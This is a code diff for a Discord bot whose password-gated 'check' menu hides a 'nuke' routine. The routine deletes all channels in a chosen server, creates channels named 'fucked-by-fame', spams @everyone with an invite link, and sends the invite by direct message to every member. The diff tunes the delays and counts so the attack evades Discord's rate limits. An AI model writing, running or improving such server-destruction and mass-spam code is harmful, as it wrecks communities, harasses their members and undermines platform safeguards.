@@ -78,7 +78,6 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Start Button
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -89,7 +88,6 @@ client.on('interactionCreate', async interaction => {
       return await interaction.showModal(modal);
     }
 
-    // Password Modal
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) {
@@ -117,7 +115,6 @@ client.on('interactionCreate', async interaction => {
       userSessions.set(interaction.user.id, {});
     }
 
-    // Server Select
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
       await interaction.deferUpdate();
       const guildId = interaction.values[0];
@@ -140,7 +137,6 @@ client.on('interactionCreate', async interaction => {
       });
     }
 
-    // Action Select
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
       if (interaction.values[0] === 'nuke') {
         const modal = new ModalBuilder()
@@ -153,7 +149,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== NUKE - FASTER + DM INVITE ====================
+    // ==================== NUKE - RATE LIMIT SAFE ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -166,23 +162,24 @@ client.on('interactionCreate', async interaction => {
       const guild = client.guilds.cache.get(session?.guildId);
       if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
 
-      await interaction.editReply({ content: `☢️ Starting nuke on **${guild.name}**...` });
+      await interaction.editReply({ content: `☢️ Starting safe nuke on **${guild.name}**...` });
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
       const invite = 'https://discord.gg/NANQMy3WnD';
 
       try {
-        // Delete all channels
+        // Delete channels
+        await interaction.editReply({ content: '🗑️ Deleting all channels...' });
         for (const channel of guild.channels.cache.values()) {
           await channel.delete().catch(() => {});
-          await delay(350);
+          await delay(600);
         }
 
-        // Create channels (faster)
-        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels (faster)...' });
+        // Create channels (safer speed)
+        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels...' });
         const created = [];
 
-        for (let i = 0; i < 25; i++) {
+        for (let i = 0; i < 15; i++) {   // Reduced to 15 for safety
           try {
             const chan = await guild.channels.create({
               name: 'fucked-by-fame',
@@ -190,7 +187,7 @@ client.on('interactionCreate', async interaction => {
               reason: 'Nuke by Fame'
             });
             created.push(chan);
-            await delay(650); // Faster than before
+            await delay(1200); // Safe delay
           } catch (e) { break; }
         }
 
@@ -199,35 +196,33 @@ client.on('interactionCreate', async interaction => {
         const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
         for (const channel of created) {
-          for (let i = 0; i < 10; i++) {
+          for (let i = 0; i < 8; i++) {
             channel.send(spam).catch(() => {});
-            if (i % 3 === 0) await delay(400);
+            if (i % 3 === 0) await delay(800);
           }
         }
 
-        // DM Members with invite
-        await interaction.editReply({ content: '📨 Sending invite to members via DM...' });
+        // DM Members (very slow)
+        await interaction.editReply({ content: '📨 Sending DM invites...' });
         let dmCount = 0;
         const members = await guild.members.fetch();
 
         for (const member of members.values()) {
-          if (!member.user.bot && member.id !== interaction.user.id) {
-            try {
-              await member.send(`**fucked by veynetta**\n${invite}\n**FAME REAL FAME**`).catch(() => {});
-              dmCount++;
-              await delay(700); // DM rate limit safety
-            } catch {}
-          }
+          if (member.user.bot || member.id === interaction.user.id) continue;
+          try {
+            await member.send(`fucked by veynetta\n${invite}\n**FAME REAL FAME**`).catch(() => {});
+            dmCount++;
+            await delay(1200); // Very slow DM rate
+          } catch (e) {}
         }
 
-        // Final message
         await interaction.editReply({ 
-          content: `✅ **NUKE COMPLETE**\n• Created **${created.length}** \`fucked-by-fame\` channels\n• Spammed @everyone + invite\n• Sent invite to **${dmCount}** members` 
+          content: `✅ **NUKE COMPLETE**\n• Created **${created.length}** \`fucked-by-fame\` channels\n• Spammed @everyone\n• Sent DM to **${dmCount}** members` 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.editReply({ content: '⚠️ Nuke partially failed.' });
+        await interaction.editReply({ content: '⚠️ Nuke stopped due to rate limits.' });
       }
 
       userSessions.delete(interaction.user.id);
